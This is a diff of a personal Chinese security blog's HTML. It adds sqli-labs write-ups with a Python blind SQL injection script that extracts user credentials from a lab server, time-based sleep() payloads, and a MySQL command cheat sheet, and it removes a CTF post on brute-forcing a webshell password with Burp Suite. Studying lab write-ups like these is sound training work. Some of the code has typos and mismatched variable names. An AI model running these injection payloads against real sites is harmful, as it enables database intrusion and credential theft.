name = name+i</span><br><span class="line">				print(name)</span><br><span class="line">				<span class="keyword">break</span>		</span><br><span class="line">	print(<span class="string">'column_name:'</span>,name)</span><br><span class="line">column_name()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">data</span><span class="params">()</span>:</span></span><br><span class="line">	data = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">			url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">			password = <span class="string">"?id=1' and substr((select group_concat(username,' ',password) from users),%d,1)='%s'"</span> %(j,i)</span><br><span class="line">			r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				data = data+i</span><br><span class="line">				print(data)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">'data:'</span>,data)</span><br><span class="line">data()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dumb Dumb,Angelina I-kill-you,Dummy p@ssword,secure crappy,stupid stupidity,superman genious,batman mob!le,admin admin,admin1 admin1,admin2 admin2,admin3 admin3,dhakkan dumbo,admin4 admin4</span></span><br></pre></td></tr></table></figure>
+<h2 id="Less-9-GET-Blind-Time-Based-Single-Quotes"><a href="#Less-9-GET-Blind-Time-Based-Single-Quotes" class="headerlink" title="Less-9 GET-Blind-Time Based-Single Quotes"></a>Less-9 GET-Blind-Time Based-Single Quotes</h2><ol>
+<li>时间延迟型盲注原理：<br>界面返回值只有一种true，无论输入任何值,返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1&apos; and if(1=1,sleep(5),0)--+</span><br><span class="line">采用前几题的判断方法发现页面没有任何变化，都是You are in...，</span><br><span class="line">因而猜测是时间延迟型注入，构造payload发现页面延迟5秒后刷新，猜测正确</span><br><span class="line"></span><br><span class="line">#之后的操作与布尔型盲注类似，只是将Less-8中构造的payload</span><br><span class="line">作为if()函数的判断条件，根据页面是否延迟刷新来判断是否正确，例如：</span><br><span class="line">?id=1&apos; and if(length(databade()&gt;5),sleep(5),0)--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-10-GET-Blind-Time-Based-Double-Quotes"><a href="#Less-10-GET-Blind-Time-Based-Double-Quotes" class="headerlink" title="Less-10 GET-Blind-Time Based-Double Quotes"></a>Less-10 GET-Blind-Time Based-Double Quotes</h2><p>这题和上一题一样，只不过这题是双引号型注入。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/常用SQL语句/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="kawhi">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kawhi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kawhi">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/01/常用SQL语句/" class="post-title-link" itemprop="http://yoursite.com/index.html">SQL常用语句</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-01 19:37:16" itemprop="dateCreated datePublished" datetime="2019-03-01T19:37:16+08:00">2019-03-01</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-08 21:31:54" itemprop="dateModified" datetime="2019-03-08T21:31:54+08:00">2019-03-08</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/SQL/" itemprop="url" rel="index"><span itemprop="name">SQL</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#MySQL</span><br><span class="line">首先得配置mysql环境（phpstudy）</span><br><span class="line">然后命令行输入SQL语句，MySQL的SQL语句以分号(;)作为结束标识</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#MySQL常用命令</span><br><span class="line">mysql -u root -p           进入mysql</span><br><span class="line">Enter password:root        默认密码为root，可以修改</span><br><span class="line"></span><br><span class="line">show databases;            显示所有的数据库</span><br><span class="line">information_schema         mysql本身架构有关数据</span><br><span class="line">mysql</span><br><span class="line">performance_schema</span><br><span class="line"></span><br><span class="line">use information_schema;       </span><br><span class="line">选择要操作的MySQL数据库，使用该命令后所有MySQL命令都只针对该数据库</span><br><span class="line"></span><br><span class="line">show tables;         </span><br><span class="line">显示当前数据库中的所有表，使用该命令前需要使用use命令来选择要操作的数据库</span><br><span class="line">columns         </span><br><span class="line">存储用户创建的所有数据库的库名，表名和字段名，存放字段名的字段是column_name</span><br><span class="line">schemata        </span><br><span class="line">存储用户创建的所有数据库的库名，对应的字段名为schema_name</span><br><span class="line">tables          </span><br><span class="line">存储用户创建的所有数据库的库名和表名，对应的字段名为table_schema,table_name</span><br><span class="line"></span><br><span class="line">show columns from 数据表;       </span><br><span class="line">显示数据表的属性，属性类型，主键信息是否为NULL，默认值等其他信息</span><br><span class="line"></span><br><span class="line">show index from 数据表;          </span><br><span class="line">显示数据表的详细索引信息，包括PRIMARY KEY（主键）</span><br><span class="line"></span><br><span class="line">show table status like &apos;数据表&apos;;      </span><br><span class="line">该命令将输出MySQL数据库管理系统的性能及统计信息    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#select选择语句</span><br><span class="line">select * from schemata;        选择表中的全部可用字段</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata;       </span><br><span class="line">显示某一表中的某一字段</span><br><span class="line">select schema_name from schemata;     </span><br><span class="line">当选择要操作的数据库后，该语句才可以选择相应字段</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema = &apos;mysql&apos;;</span><br><span class="line">显示某一数据库中的某一表中的某一字段		</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_schema=&apos;hyb&apos; and table_name = &apos;test&apos;;         </span><br><span class="line">显示某一数据库中的某一表的某一字段的记录</span><br><span class="line"></span><br><span class="line">select * from schemata limit m,n;         </span><br><span class="line">从表中第m+1条记录开始，取n条记录</span><br><span class="line"></span><br><span class="line">select * from schemata order by schemata_name asc;       </span><br><span class="line">输出表中的数据按照某一字段升序排序（desc是降序）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#union运算符</span><br><span class="line">SELECT column_name(s) FROM table1</span><br><span class="line">UNION</span><br><span class="line">SELECT column_name(s) FROM table2;</span><br><span class="line">UNION中的每个SELECT语句必须具有相同的列数</span><br><span class="line">这些列也必须具有相似的数据类型</span><br><span class="line">每个SELECT语句中的列也必须以相同的顺序排列</span><br><span class="line">默认情况下，UNION运算符选择一个不同的值。如果允许重复值，使用UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#注释</span><br><span class="line">单行注释 #   或者   --+</span><br><span class="line">多行注释 /*   */</span><br><span class="line">扩展：/*!   */</span><br><span class="line">自MySQL3.23 版以来，可在C 风格的注释中“隐藏” MySQL特有的关键字，注释以“/!*”而不是以“/*”起头。MySQL查看这种特殊类型注释的内部并使用这些关键字，但其他数据库服务器将这些关键字作为注释的一部分忽略。这样有助于编写由MySQL执行时利用MySQL特有功能的代码，而且该代码也可以不用修改就用于其他数据库服务器。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#函数</span><br><span class="line">database()        查看当前网站使用的数据库</span><br><span class="line">version()         查看当前MySQL的版本</span><br><span class="line">user()            查看当前MySQL的用户</span><br><span class="line">connection_id()   查看当前服务器的连接次数</span><br><span class="line">password()        对字符串（一般来自用户的密码）进行加密</span><br><span class="line">md5()             对字符串（一般是普通的数据）进行md5加密</span><br></pre></td></tr></table></figure>
 
           
         
@@ -616,7 +820,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-03-05 15:42:38" itemprop="dateModified" datetime="2019-03-05T15:42:38+08:00">2019-03-05</time>
+                <time title="修改时间：2019-03-05 23:06:04" itemprop="dateModified" datetime="2019-03-05T23:06:04+08:00">2019-03-05</time>
               
             
           </span>
@@ -2131,206 +2335,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/20/网站被黑/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kawhi">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/kawhi.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kawhi">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/20/网站被黑/" class="post-title-link" itemprop="http://yoursite.com/index.html">网站被黑</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-02-20 16:14:19" itemprop="dateCreated datePublished" datetime="2019-02-20T16:14:19+08:00">2019-02-20</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-03-01 19:19:41" itemprop="dateModified" datetime="2019-03-01T19:19:41+08:00">2019-03-01</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
-
-                
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h3><p><a href="http://123.206.87.240:8002/webshell/" target="_blank" rel="noopener">http://123.206.87.240:8002/webshell/</a><br>这个题没技术含量但是实战中经常遇到   </p>
-<h3 id="thinking"><a href="#thinking" class="headerlink" title="thinking"></a>thinking</h3><p>打开链接后提示网站存在漏洞。猜测网页后门可能存在漏洞。<br><img src="https://kawhi123.github.io/images/网站被黑/01.png" alt="">    </p>
-<h3 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h3><ol>
-<li><p>使用御剑扫一下网页后台，看能不能扫到webshell。<br>这里推荐一个CTF工具库：<a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">https://www.ctftools.com/down/</a><br>复制域名到御剑，点击开始扫描可以得到两个网页地址。<br><img src="https://kawhi123.github.io/images/网站被黑/02.png" alt="">    </p>
-</li>
-<li><p>点击进入第二个网页（webshell），发现需要密码。<br><img src="https://kawhi123.github.io/images/网站被黑/03.png" alt="">    </p>
-</li>
-<li><p>再使用burp暴力破解密码。<br><img src="https://kawhi123.github.io/images/网站被黑/04.png" alt="">    </p>
-</li>
-<li><p>鼠标单击<code>pass=4fahg</code>所在的那一行，右键选择 <code>Send to Itruder</code>。<br>然后依次点击 <code>Intruder&gt;Payloads</code>，<code>Payload type</code>选择<code>Simple list</code>，<code>Add from list</code>选择<code>Passwords</code>。<br>最后点击右上角<code>Start attack</code>，开始暴力破解密码。<br><img src="https://kawhi123.github.io/images/网站被黑/05.png" alt="">   </p>
-</li>
-<li><p>点击<code>Length</code>按照长度排序，发现有一个不同的长度是1110，对应的Payload是 <strong>hack</strong>。   </p>
-</li>
-<li><p>最后输入破解的密码 hack 可以得到 <strong>flag{hack_bug_ku035}</strong>。  </p>
-</li>
-</ol>
-<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><ol>
-<li><p>了解什么是webshell    </p>
-</li>
-<li><p>使用御剑后门扫描工具和Burp Suite</p>
-</li>
-</ol>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2380,7 +2384,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">27</span>
+                    <span class="site-state-item-count">28</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
